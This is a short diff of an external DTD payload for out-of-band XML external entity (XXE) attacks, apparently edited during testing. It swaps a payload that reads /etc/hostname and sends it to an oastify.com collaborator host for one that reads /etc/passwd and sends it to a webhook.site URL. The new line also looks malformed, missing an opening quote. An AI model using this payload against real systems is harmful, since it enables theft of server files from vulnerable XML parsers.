@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://%file;.d6kjiram5v62jtspd5xvubigt7zynpbe.oastify.com'>">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM https://webhook.site/8ffb4943-e12e-4678-9b43-c86ecd8b6daa/?x=%file;'>">
 %all;
